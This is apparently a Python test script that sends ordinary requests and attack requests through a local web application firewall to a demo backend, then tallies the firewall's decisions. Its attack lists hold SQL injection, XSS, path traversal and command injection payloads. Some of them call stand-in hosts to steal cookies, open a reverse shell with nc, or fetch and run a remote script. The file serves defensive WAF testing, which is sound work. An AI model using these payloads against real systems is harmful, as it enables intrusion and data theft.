# test_traffic.py — run from project root
#
# Sends varied requests through the live WAF (port 8000) to the protected
# demo backend (dummy_app.py, port 5000).
#
# This version prints the full WAF diagnostic headers so we can identify
# why a request was allowed, logged, or blocked:
#
#   X-WAF-Decision
#   X-WAF-Score
#   X-WAF-Label
#   X-WAF-Layer
#   X-WAF-L2A-Score
#   X-WAF-Confidence
#
# Use this first to diagnose NORMAL traffic before making any retraining
# or threshold changes.

import time
import requests

BASE = "http://127.0.0.1:8000"
DELAY_SEC = 0.6
MAX_RETRIES = 3


def send(method, path, **kwargs):
    for attempt in range(MAX_RETRIES):
        r = requests.request(
            method,
            BASE + path,
            timeout=10,
            **kwargs,
        )

        if r.status_code == 429:
            wait = float(r.headers.get("Retry-After", 2))
            print(
                f"  429 rate-limited on {path[:60]} "
                f"— backing off {wait}s"
            )
            time.sleep(wait)
            continue

        return r

    return r


# ============================================================
# NORMAL — ordinary application traffic
# ============================================================

normal = [
    ("GET",  "/api/products"),
    ("GET",  "/api/products?category=electronics"),
    ("GET",  "/api/products?category=electronics&page=2&limit=5"),
    ("GET",  "/api/products/search?q=laptop"),
    ("GET",  "/api/products/search?q=wireless+mouse"),
    ("GET",  "/api/products/search?q=headphones"),
    ("GET",  "/api/products/101"),
    ("GET",  "/api/products/102"),
    ("GET",  "/api/users/profile?user_id=1"),
    ("GET",  "/api/users/profile?user_id=42"),
    ("GET",  "/api/orders"),
    ("GET",  "/api/orders?user_id=1&status=delivered"),
    ("GET",  "/api/orders/details?order_id=5001"),
    ("GET",  "/api/cart"),
    ("GET",  "/api/cart?user_id=7"),
    ("GET",  "/api/reviews"),
    ("GET",  "/api/reviews?product_id=101&sort=recent"),
    ("GET",  "/api/reviews?product_id=102&sort=top"),
    (
        "GET",
        "/api/contact?subject=Question&message=When+will+my+order+ship",
    ),
    (
        "GET",
        "/api/contact?subject=Feedback&message=Great+service+thanks",
    ),
    ("GET",  "/api/files/view?path=readme.txt"),
    ("GET",  "/api/files/download?file=invoice.pdf"),
    ("GET",  "/api/system/check?value=status"),
    ("GET",  "/api/admin/dashboard"),
    ("GET",  "/api/admin/users?search=john&page=1"),
    ("GET",  "/hello"),
    ("GET",  "/"),
    (
        "POST",
        "/api/users/login",
        {
            "params": {
                "username": "john",
                "password": "hello123",
            }
        },
    ),
    (
        "POST",
        "/api/users/login",
        {
            "params": {
                "username": "maria",
                "password": "correcthorsebattery",
            }
        },
    ),
    (
        "GET",
        "/api/products?category=books&page=1&limit=20",
    ),
    (
        "GET",
        "/api/products/search?q=coffee+maker",
    ),
    (
        "GET",
        "/api/products/search?q=run",
    ),
]


# ============================================================
# SQLi
# ============================================================

sqli = [
    (
        "GET",
        "/api/products/search?q=laptop' OR '1'='1",
    ),
    (
        "GET",
        "/api/products/search?q=' UNION SELECT username,password FROM users--",
    ),
    (
        "GET",
        "/api/products/101 OR 1=1",
    ),
    (
        "GET",
        "/api/users/profile?user_id=1' OR '1'='1' --",
    ),
    (
        "GET",
        "/api/orders/details?order_id=5001; DROP TABLE orders;--",
    ),
    (
        "GET",
        "/api/reviews?product_id=101 UNION SELECT NULL,NULL,NULL--",
    ),
    (
        "POST",
        "/api/users/login",
        {
            "params": {
                "username": "admin'--",
                "password": "x",
            }
        },
    ),
    (
        "POST",
        "/api/users/login",
        {
            "params": {
                "username": "' OR 1=1#",
                "password": "anything",
            }
        },
    ),
    (
        "GET",
        "/api/admin/users?search=' OR 'a'='a",
    ),
    (
        "GET",
        "/api/products?category=electronics' AND SLEEP(5)--",
    ),
    (
        "GET",
        "/api/products/search?q=1' AND (SELECT COUNT(*) FROM users)>0--",
    ),
    (
        "GET",
        "/api/orders?user_id=1' UNION SELECT credit_card FROM payments--",
    ),
]


# ============================================================
# XSS
# ============================================================

xss = [
    (
        "GET",
        "/api/products/search?q=<script>alert(1)</script>",
    ),
    (
        "GET",
        "/api/contact?subject=<img src=x onerror=alert('xss')>&message=hi",
    ),
    (
        "GET",
        "/api/reviews?product_id=101&sort=<svg onload=alert(document.cookie)>",
    ),
    (
        "GET",
        "/api/products?category=<script>fetch('//evil.com?c='+document.cookie)</script>",
    ),
    (
        "GET",
        "/api/contact?subject=test&message=<iframe src=javascript:alert(1)>",
    ),
    (
        "GET",
        "/api/products/search?q=%3Cscript%3Ealert(String.fromCharCode(88,83,83))%3C/script%3E",
    ),
    (
        "GET",
        "/api/admin/users?search=<body onload=alert('pwned')>",
    ),
    (
        "GET",
        "/api/users/profile?user_id=<script>document.location='http://evil.com'</script>",
    ),
    (
        "GET",
        "/api/reviews?product_id=<img src=x onerror=this.src='http://evil.com/'+document.cookie>",
    ),
    (
        "GET",
        "/api/products/search?q=\"><script>alert(1)</script>",
    ),
]


# ============================================================
# LFI
# ============================================================

lfi = [
    (
        "GET",
        "/api/files/view?path=../../../../etc/passwd",
    ),
    (
        "GET",
        "/api/files/view?path=..%2f..%2f..%2fetc%2fpasswd",
    ),
    (
        "GET",
        "/api/files/download?file=../../../../windows/win.ini",
    ),
    (
        "GET",
        "/api/files/view?path=....//....//....//etc/shadow",
    ),
    (
        "GET",
        "/api/files/view?path=/etc/passwd%00.txt",
    ),
    (
        "GET",
        r"/api/files/view?path=..\..\..\..\boot.ini",
    ),
    (
        "GET",
        "/api/files/download?file=php://filter/convert.base64-encode/resource=index.php",
    ),
    (
        "GET",
        "/api/files/view?path=..%252f..%252f..%252fetc%252fpasswd",
    ),
    (
        "GET",
        "/api/files/view?path=file:///etc/passwd",
    ),
    (
        "GET",
        r"/api/files/download?file=....\\....\\....\\etc\\passwd",
    ),
]


# ============================================================
# OTHER_ATTACK
# ============================================================

other_attack = [
    (
        "GET",
        "/api/system/check?value=status; cat /etc/passwd",
    ),
    (
        "GET",
        "/api/system/check?value=status && whoami",
    ),
    (
        "GET",
        "/api/system/check?value=status | nc attacker.com 4444 -e /bin/sh",
    ),
    (
        "GET",
        "/api/system/check?value=status`id`",
    ),
    (
        "GET",
        "/api/system/check?value=status$(curl http://evil.com/shell.sh|sh)",
    ),
    (
        "GET",
        "/api/products?category=electronics&callback=http://169.254.169.254/latest/meta-data/",
    ),
    (
        "GET",
        "/api/contact?subject=test&message=;ping -c 10 127.0.0.1;",
    ),
    (
        "POST",
        "/api/users/login",
        {
            "params": {
                "username": "admin",
                "password": "x' ; DROP TABLE users; --",
            }
        },
    ),
]


CATEGORIES = [
    ("NORMAL", normal, "diagnostic — inspect false positives"),
    ("SQLi", sqli, "expect mostly BLOCK"),
    ("XSS", xss, "expect mostly BLOCK"),
    ("LFI", lfi, "expect mixed ALLOW/LOG/BLOCK"),
    ("OTHER_ATTACK", other_attack, "expect mixed LOG/BLOCK"),
]


def print_diagnostics(r, method, path):
    """
    Print every WAF diagnostic header.

    These are the most important fields for diagnosing normal-traffic
    false positives.
    """

    status = r.status_code

    decision = r.headers.get("X-WAF-Decision", "?")
    score = r.headers.get("X-WAF-Score", "?")
    label = r.headers.get("X-WAF-Label", "?")
    layer = r.headers.get("X-WAF-Layer", "?")
    l2a_score = r.headers.get("X-WAF-L2A-Score", "?")
    confidence = r.headers.get("X-WAF-Confidence", "?")
    request_id = r.headers.get("X-WAF-Request-ID", "?")

    print(
        f"[{status}] "
        f"decision={decision:<6} "
        f"score={score:<3} "
        f"label={label:<12} "
        f"layer={layer:<3} "
        f"l2a={l2a_score:<12} "
        f"conf={confidence:<7} "
        f"{method:<4} "
        f"{path[:65]}"
    )

    # Extra line for blocked/logged normal requests.
    if decision in {"block", "log"}:
        print(
            f"       └─ request_id={request_id} "
            f"| label={label} "
            f"| layer={layer} "
            f"| L2A={l2a_score} "
            f"| confidence={confidence}"
        )

    return {
        "decision": decision,
        "score": score,
        "label": label,
        "layer": layer,
        "l2a_score": l2a_score,
        "confidence": confidence,
    }


def run_category(name, requests_list, note):
    print("\n" + "=" * 110)
    print(f"  {name}  ({len(requests_list)} requests) — {note}")
    print("=" * 110)

    tally = {}

    for item in requests_list:
        method, path = item[0], item[1]
        kwargs = item[2] if len(item) > 2 else {}

        try:
            r = send(method, path, **kwargs)

            info = print_diagnostics(
                r,
                method,
                path,
            )

            decision = info["decision"]
            tally[decision] = tally.get(decision, 0) + 1

        except requests.exceptions.RequestException as e:
            print(
                f"[ERR] {method} {path[:70]} -> {e}"
            )
            tally["ERROR"] = tally.get("ERROR", 0) + 1

        time.sleep(DELAY_SEC)

    print(
        f"  -- {name} summary: {tally}"
    )

    return tally


def main():
    print(f"Sending traffic to WAF at {BASE} ...")
    print(
        "Diagnostic mode enabled: "
        "decision / score / label / layer / L2A / confidence"
    )

    overall = {}

    for name, reqs, note in CATEGORIES:
        tally = run_category(
            name,
            reqs,
            note,
        )

        for key, value in tally.items():
            overall[key] = overall.get(key, 0) + value

    total = sum(overall.values())

    print("\n" + "=" * 110)
    print(
        f"  OVERALL ({total} requests across {len(CATEGORIES)} categories)"
    )
    print("=" * 110)

    for decision, count in sorted(
        overall.items(),
        key=lambda kv: -kv[1],
    ):
        pct = (
            100 * count / total
            if total
            else 0
        )

        print(
            f"  {decision:<10} "
            f"{count:>4}  "
            f"({pct:5.1f}%)"
        )


if __name__ == "__main__":
    main()